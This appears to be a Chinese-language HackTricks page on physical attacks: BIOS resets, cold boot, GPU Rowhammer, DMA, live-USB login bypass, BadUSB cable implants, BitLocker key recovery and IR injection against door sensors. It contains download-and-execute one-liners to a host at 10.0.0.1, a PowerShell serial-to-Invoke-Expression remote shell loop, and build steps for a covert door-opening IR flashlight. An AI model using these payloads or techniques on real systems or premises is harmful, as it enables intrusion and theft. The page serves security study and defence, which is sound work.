# 物理攻击

{{#include ../banners/hacktricks-training.md}}

对于板级接口发现、串口控制台、闪存访问、侧信道和 glitching，请参阅 [Hardware Hacking](hardware-hacking/README.md) 及其针对特定接口的章节。本页介绍需要对整个系统进行物理访问的攻击。

## BIOS 密码恢复与系统安全

旧式 PC 固件设置可能会在断开 CMOS 电池或使用文档说明的清除 CMOS 跳线后重置。所需的断电时间因主板而异；现代 UEFI 密码或密钥可能存储在非易失性闪存、嵌入式控制器或安全设备中，因此取下电池也无法清除。短接针脚前，请先查阅主板或维修手册；此操作还可能使 TPM 测量值失效，并触发磁盘加密恢复。

在旧式 x86 系统上，可从可启动环境运行 **killCMOS** 和 **CmosPwd** 等工具，检查或修改由 CMOS 保存的设置。CmosPwd 可识别一组有文档记录的旧 BIOS 系列所使用的密码格式，并可备份、恢复或清除/杀除 CMOS 状态；其公开构建版本面向旧式 DOS/Windows、Linux、FreeBSD 和 NetBSD 环境。<sup>[[18]](#references)</sup> 这些工具并非通用的 UEFI 密码移除工具，且需要足够的硬件/固件访问权限。

部分笔记本电脑固件会在多次输错密码后显示厂商专用的挑战码。[bios-pw.org](https://bios-pw.org) 等数据库可为部分型号推导旧式厂商恢复密码，但许多系统实现的锁定机制并不会生成可推导的挑战码。请将生成的密码视为仅适用于特定型号，并避免耗尽永久尝试次数。

### UEFI 安全性

对于现代 **UEFI** 系统，可使用 CHIPSEC 审计 Secure Boot 变量保护。请先运行以下不会修改系统的检查；可选的 `-a modify` 模式会主动尝试破坏变量，仅应在可恢复的实验室系统上使用。CHIPSEC 本身也警告，其特权驱动和底层硬件访问不适用于生产终端。<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 分析与冷启动攻击

DRAM 不会在停止刷新后立即丢失所有位。数据衰减速率因模块技术和温度而有很大差异；与未冷却的断电重启相比，降温可以让有用数据保留更久。冷启动攻击会迅速重启到精简的采集环境，或转移经过冷却的内存模块，捕获原始内存，并在位衰减的情况下重建加密密钥。磁盘复制工具并不自动具备物理内存成像功能，而 Volatility 分析的是内存转储，并不负责采集；应使用适用于目标平台且经过验证的采集工具。<sup>[[12]](#references)</sup>

---

## 针对页表的 GPU Rowhammer

当现代 GPU Rowhammer 攻击将目标从普通缓冲区转向**GPU 虚拟内存元数据**时，其威力会大幅提升。近期针对 **GDDR6 NVIDIA Ampere GPU** 的研究表明，攻击者可以运行未经特权授权的 CUDA 代码，构造适用于 GPU 的锤击模式，通过**内存布局调控**将分页结构放置在易受攻击的行中，进而翻转**末级页表**或中间**页目录**中的位。一旦某个地址转换条目遭到破坏，攻击者就能进一步获得**任意 GPU 内存读写**能力，并转而攻击主机。<sup>[[1]](#references)[[2]](#references)</sup>

### 利用模式

1. **分析可锤击的行**，并在 GDDR6 中构造能够绕过 DRAM 内缓解措施、感知刷新周期且非均匀的锤击模式。
2. **调控 GPU 分配**，让驱动程序将地址转换结构放置在可锤击的物理位置，而非默认的受保护内存池中。实际操作中，这可能包括耗尽低内存页表区域，并以受控步长大量分配稀疏 UVM 映射。
3. **翻转地址转换元数据**，例如页表或页目录条目中的 **PFN** 或与 aperture 相关的位，使攻击者控制的虚拟页指向页表页、任意 GPU 内存或主机可见的系统映射。
4. 重用伪造的映射来改写其他地址转换条目，并提升为跨 GPU 上下文的**任意 GPU 内存读写**能力。

### 转向主机与缓解措施

- **禁用 IOMMU** 时，伪造的系统 aperture 映射可能向 GPU 暴露任意**主机物理内存**，使 GPU 原语升级为对主机的完全控制。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** 针对末级页表条目，而 **GeForge** 表明，破坏页目录级别可能更容易，因为翻转一位就能重定向更大的地址转换子树。不要只将某一层分页结构视为安全关键组件。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** 仍然重要，因为它能阻止 GDDRHammer/GeForge 所利用的直接任意主机内存访问路径，但它**并非完整的缓解措施**。**GPUBreach** 展示了第二阶段的攻击路径：攻击者破坏 GPU 可写、由驱动程序管理的 CPU 缓冲区，随后触发 NVIDIA 驱动程序的内存安全漏洞，从而获得内核写入原语，并在启用 IOMMU 的情况下取得 **root shell**。<sup>[[3]](#references)</sup>
- 在受支持的工作站/服务器 GPU 上，启用**系统级 ECC** 是一种实用的加固措施。没有 ECC 的消费级 GPU 防御能力较弱。<sup>[[4]](#references)</sup>
- 这些攻击并非纯属理论：**GeForge** 在 RTX 3060 上报告了 **1,171** 次位翻转，在 RTX A6000 上报告了 **202** 次，足以构建可行的主机权限提升攻击链。<sup>[[2]](#references)[[9]](#references)</sup>

---

## 直接内存访问（DMA）攻击

关于可降低启动前 IOMMU 强制执行级别并启用 Windows DMA 攻击链的离线 UEFI IFR/NVRAM 补丁，请参阅：

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** 展示了通过 FireWire 和早期 Thunderbolt 配置等接口进行 **DMA 内存采集与修改**的方法，其中也包括历史上的登录绕过特征。不能简单地说它“对 Windows 10 无效”：能否利用取决于接口、目标版本、IOMMU 策略、锁定状态，以及 Windows Kernel DMA Protection 是否受支持并已启用。Windows 10 version 1803 及更高版本在兼容平台上引入了 Kernel DMA Protection，大幅改变了攻击面。<sup>[[13]](#references)[[14]](#references)</sup>

---

## 使用 Live CD/USB 访问系统

对于未加密或已解锁的 Windows 卷，可在离线环境中将 **sethc.exe** 或 **Utilman.exe** 等辅助功能二进制文件替换为 **cmd.exe**，这样在登录屏幕上按下相应快捷键时就会出现 SYSTEM 命令提示符。**chntpw** 等工具可以编辑本地 SAM 账户数据。这些方法无法绕过已锁定的 BitLocker 卷，并可能损坏由 DPAPI/EFS 保护的凭据；应保留取证副本和备份。

**Kon-Boot** 是一款用于支持的 Windows/macOS 配置的商用启动时身份验证绕过工具。兼容性取决于操作系统、固件模式、Secure Boot 和磁盘加密设置；它不能解密已锁定的 BitLocker 卷。<sup>[[10]](#references)</sup>

---

## 处理 Windows 安全功能

### 启动与恢复快捷键

- **Delete/Supr**、F2、F10 或其他厂商指定的按键可能会打开固件设置界面。
- **F8** 只有在仍启用该路径的配置中才能进入旧版 Windows 高级启动选项；当前的恢复入口因配置而异。
- 在某些配置中，按住 **Shift** 可以阻止 Windows 自动登录，但策略/注册表设置可能会禁用此行为。<sup>[[17]](#references)</sup>

### BadUSB 设备

**USB Rubber Ducky** 和 Teensy 开发板等设备可以枚举为受信任的 HID 键盘并注入预先定义的按键。负载最初拥有已登录会话的权限和桌面访问权限；UAC 提示、屏幕锁定、键盘布局、时序和终端 USB 策略仍会限制其行为。<sup>[[15]](#references)</sup>

可编程外设还可以攻击主机内核解析器，并协调多个 USB 设备进行堆布局调控和信息泄露：

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

关于 Windows UAS 大容量存储解析器案例，请参阅：

{{#ref}}
../binary-exploitation/windows-kernel-exploitation/uasp-report-luns-cache-size-oob-write.md
{{#endref}}

### 卷影复制

管理员或备份权限可以创建卷影副本或保存注册表 hive，从而获取 **SAM** 和 **SYSTEM** 等被锁定的文件。这是一种入侵后的数据收集技术，而非权限绕过；应结合 `diskshadow`/VSS 和注册表 hive 导出事件进行关联分析。

## BadUSB / HID 植入技术

### 由 NFC 触发的 Android HID gadget

只有在 USB 控制器和内核提供 **USB gadget/HID 支持**时，已 root 的 Android 手机才能变成可编程 USB 键盘。在兼容设备上，Kali NetHunter 可通过 **USB Arsenal** 提供 gadget 配置文件。另一种选择是 [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)，它可以创建 ConfigFS gadget 功能，并可能提供 `/dev/hidg0` 和 `/dev/hidg1` 等键盘/鼠标字符设备。该工具只负责创建 gadget 端点；还必须由单独的进程向其中写入 HID 报告。内核若缺少 ConfigFS、HID gadget 支持或可用的 USB Device Controller，root 权限也无法弥补。<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

此端点可以与 Android NFC 结合，作为物理触发器。[NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) 应用会读取标签 UID，将其转换为预期的表示形式，检查本地白名单，并在匹配后发送配置好的 Rubber Ducky 风格按键序列。连接的主机只会看到普通键盘输入，无需安装 NFC 软件。<sup>[[22]](#references)[[24]](#references)</sup>

在使用快捷键或命令前，应先在空白文本编辑器中验证设备枚举情况和键盘布局。一个无害的负载示例如下：<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

重要的信任边界：<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID 白名单用于识别，而非认证**。UID 是公开的，某些令牌类型或模拟器允许克隆或冒充。复制一个已获准的 UID，会沿用原令牌相同的分发路径。
- **NfcScreenOff** Magisk 模块会修补 NFC 服务，使其表现得仿佛屏幕已亮起且已解锁。如果手机已经连接到主机，这可能让他人在不解锁手机的情况下触发 payload。
- 存储在已 root 或 bootloader 已解锁设备上的 payload 中的密码、API token 和命令，都是可恢复的机密。通过 HID 输入密码属于可重复使用密码的自动化，而非无密码认证。
- HID 注入会使用当前桌面的权限，并且取决于焦点、时机和主机键盘布局。派发敏感操作前，应要求用户近期确认；避免在脚本中存放高权限机密；如需真正的认证，应使用基于加密质询-响应的认证器。

### Wi-Fi 管理型线缆植入物

- 基于 ESP32-S3 的植入物（例如 **Evil Crow Cable Wind**）隐藏在 USB-A→USB-C 或 USB-C↔USB-C 线缆中，只枚举为 USB 键盘，并通过 Wi-Fi 暴露其 C2 堆栈。操作人员只需从受害者主机为线缆供电，创建一个名称为 `Evil Crow Cable Wind`、密码为 `123456789` 的热点，然后访问 [http://cable-wind.local/](http://cable-wind.local/)（或其 DHCP 地址），即可进入嵌入式 HTTP 界面。<sup>[[8]](#references)</sup>
- 浏览器 UI 提供 *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell* 和 *Config* 标签页。存储的 payload 会按 OS 标记，键盘布局可即时切换，VID/PID 字符串也可修改，以仿冒已知外设。
- 由于 C2 位于线缆内部，手机无需使用组织网络，就能预置 payload、触发执行并管理 Wi-Fi 凭据——适用于停留时间较短的物理入侵。

### OS 感知型 AutoExec payload

- AutoExec 规则会将一个或多个 payload 绑定为在 USB 枚举后立即触发。植入物会进行轻量级 OS 指纹识别，并选择匹配的脚本。
- 工作流程示例：
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`。
  - *macOS/Linux:* `COMMAND SPACE`（Spotlight）或 `CTRL ALT T`（终端）→ `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`。
- 由于执行过程无需人工干预，只需替换充电线缆，就能在已登录用户的上下文中实现“插入即攻陷”的初始访问。

### 通过 HID 引导的 Wi-Fi TCP 远程 shell

1. **击键引导：** 存储的 payload 会打开控制台，并粘贴一个循环，使其执行从新的 USB 串行设备接收到的所有内容。一个精简的 Windows 变体如下：

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge：**植入设备会保持 USB CDC 通道开启，同时其 ESP32-S3 会向操作人员发起 TCP 客户端连接（Python 脚本、Android APK 或桌面可执行文件）。在 TCP 会话中输入的任何字节都会被转发到上述串行循环，从而即使在与网络隔离的主机上也能实现远程命令执行。输出有限，因此操作人员通常会执行盲命令（创建账户、部署其他工具等）。

### HTTP OTA 更新入口

- 文档所述的 Evil Crow Cable Wind 接口在 `/update` 暴露了一个无需身份验证的固件更新端点：<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- 现场操作人员可以在交战过程中热插拔功能（例如刷入 USB Army Knife 固件），无需打开线缆，让 implant 在仍连接到目标主机时切换到新功能。

## 绕过 BitLocker 加密

对正在运行或近期运行过的系统进行经授权的取证采集时，如果 BitLocker 卷处于解锁状态，采集内容中可能包含 BitLocker 卷主密钥或相关密钥材料。Elcomsoft Forensic Disk Decryptor 和 Passware Kit Forensic 等商业工具可以搜索受支持的内存映像、休眠文件或崩溃转储，但不保证成功。启用 BitLocker 时，现代 Windows 也会加密崩溃转储；存储的 48 位恢复密码与内存中的卷密钥是不同的取证对象。<sup>[[12]](#references)[[16]](#references)</sup>

---

## 通过社会工程添加恢复密钥

攻击者若能说服管理员运行 BitLocker 管理命令，就可以添加恢复密码、外部密钥或其他保护程序，然后获取它。恢复密码不能是任意的全零字符串：BitLocker 数字恢复密码必须符合经过校验的 48 位格式。相关的授权管理语法为 `manage-bde -protectors -add C: -recoverypassword`；使用 `manage-bde -protectors -get C:` 列出生成的保护程序。监控保护程序的添加，并确保新恢复材料只托管在获准的位置。<sup>[[16]](#references)</sup>

---

## 利用机箱入侵 / 维护开关将 BIOS 恢复出厂设置

许多现代笔记本电脑和小型台式机都配有**机箱入侵开关**，由嵌入式控制器（EC）和 BIOS/UEFI 固件监控。虽然该开关的主要用途是在设备被打开时发出警报，但厂商有时会实现一种**未公开的恢复快捷操作**，在按照特定模式切换开关时触发。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻击原理

1. 开关连接到 EC 上的 **GPIO 中断**。
2. 运行在 EC 上的固件会跟踪**按压的时间间隔和次数**。
3. 识别到硬编码模式后，EC 会调用 *mainboard-reset* 例程，**擦除系统 NVRAM/CMOS 的内容**。
4. 下次启动时，受影响的机型会加载重置后的固件状态。根据厂商和硬件版本，被清除的状态可能包括 supervisor 密码、自定义启动设置或已注册的 Secure Boot 密钥；TPM 状态和磁盘加密的影响必须另行评估。

> 固件重置可能会恢复外部启动选项，但**不会**解密存储设备。TPM/固件变更后，BitLocker 或其他全盘加密系统可能进入恢复模式；没有恢复密钥时，内部硬盘仍会受到保护。<sup>[[16]](#references)</sup>

### 真实案例——Framework 13 笔记本电脑

Framework 13（第 11/12/13 代）的恢复快捷操作如下：

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

在第十个周期后，EC 会设置一个标志，指示 BIOS 在下次重启时清除 NVRAM。整个过程约需 40 秒，**只需要一把螺丝刀**。<sup>[[5]](#references)</sup>

### 通用利用流程

1. 开机或从挂起状态恢复目标设备，让 EC 运行。
2. 拆下底盖，露出入侵/维护开关。
3. 重现厂商特定的切换模式（查阅文档、论坛，或对 EC 固件进行逆向工程）。
4. 重新组装并重启，然后检查哪些固件设置和凭据实际发生了变化。
5. 如果已获授权且支持外部启动，可启动受控的 live image。合法解锁内部卷后（或该卷从未加密时），live 环境可以获取凭据和数据，或检查 EFI System Partition。修改该分区以安装 EFI implant 属于持久且高度侵入性的操作，并且仍受 Secure Boot、measured boot、固件写保护和终端监控的限制。没有密钥或恢复材料，加密存储仍无法访问。

### 检测与缓解

* 在 OS 管理控制台中记录机箱入侵事件，并与意外的 BIOS 重置进行关联分析。
* 在螺丝/外壳上使用**防篡改封条**，以检测设备是否被打开。
* 将设备放在**受物理控制的区域**；应假设物理访问等同于完全失陷。
* 如果设备支持，可禁用厂商的“维护开关重置”功能，或要求通过额外的加密授权才能重置 NVRAM。

---

## 针对无接触出门传感器的隐蔽 IR 注入

### 传感器特性
- 常见的“挥手出门”传感器将近红外 LED 发射器与电视遥控器式接收器模块配对；只有检测到多个（约 4–10 个）正确载波（约 30 kHz）脉冲后，接收器才会输出逻辑高电平。<sup>[[7]](#references)</sup>
- 塑料遮罩会阻止发射器和接收器直接互相照射，因此控制器会假定任何经过验证的载波都来自附近物体的反射，并驱动继电器打开门锁。
- 控制器确认目标存在后，通常会改变发出的调制包络，但接收器仍会接受任何符合滤波后载波要求的脉冲串。

### 攻击流程
1. **捕获发射特征** – 将逻辑分析仪接到控制器引脚上，记录驱动内部 IR LED 的检测前和检测后波形。
2. **只重放“检测后”波形** – 移除/忽略原装发射器，从一开始就用外部 IR LED 发出已经触发后的模式。由于接收器只关心脉冲数量/频率，因此会将伪造载波视为真实反射，并使继电器线路变为有效状态。
3. **控制发射时序** – 以经过调整的脉冲串发射载波（例如，发射数十毫秒，然后间隔相近时长），在不使接收器的 AGC 或干扰处理逻辑饱和的情况下，达到最低脉冲数。持续发射会迅速降低传感器灵敏度，使继电器无法触发。

### 远距离反射注入
- 将台式 LED 替换为高功率 IR 二极管、MOSFET 驱动器和聚焦光学器件，可实现约 6 m 外的可靠触发。
- 攻击者不需要与接收器开口保持视线直通；将光束对准玻璃可见的室内墙壁、货架或门框，反射能量便可进入约 30° 的视野，模拟近距离挥手。
- 由于接收器只预期检测微弱反射，强得多的外部光束即使经过多个表面反射，仍可能高于检测阈值。

### 武器化攻击手电筒
- 将驱动器藏在商用手电筒内部，可让工具隐藏在显眼处。用与接收器波段匹配的高功率 IR LED 替换可见 LED，添加 ATtiny412（或类似 MCU）以生成约 30 kHz 的脉冲串，并用 MOSFET 吸收 LED 电流。
- 伸缩变焦镜头可收窄光束，以提高射程和精度；由 MCU 控制的振动马达可在调制启用时提供触觉确认，而不发出可见光。
- 轮流使用几种预存的调制模式（载波频率和包络略有不同），可提高对不同贴牌传感器系列的兼容性；操作者可逐个扫描反射表面，直到听到继电器咔嗒声、门锁打开。

---

## References

- [1] [GDDRHammer：大幅扰乱 DRAM 行——来自现代 GPU 的跨组件 Rowhammer 攻击](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge：敲击 GDDR 内存以伪造 GPU 页表，乐趣与收益兼得](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach：利用 Rowhammer 对 GPU 发起权限提升攻击](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 安全公告：Rowhammer - 2025 年 7 月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13：按这里即可 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 主板重置指南](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “别碰！——用隐蔽 IR 手电筒绕过 IR 无接触出门传感器”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “插入、运行、Pwn：使用 Evil Crow Cable Wind 进行 hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - 针对 NVIDIA 芯片的 Rowhammer 攻击](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 官方文档和兼容性信息](https://kon-boot.com/)
- [11] [CHIPSEC 文档 - Secure Boot 变量保护](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [铭记于心：针对加密密钥的冷启动攻击](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - 通过 DMA 操纵物理内存](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - 内核 DMA 保护](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 文档](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 操作指南](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - 按住 Shift 键与自动登录行为](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 文档和下载](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux 文档 - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux 内核文档 - USB HID gadget 驱动程序](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [将已 Root 的 Android 手机变成 NFC 身份验证器和 PC 自动化工具](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
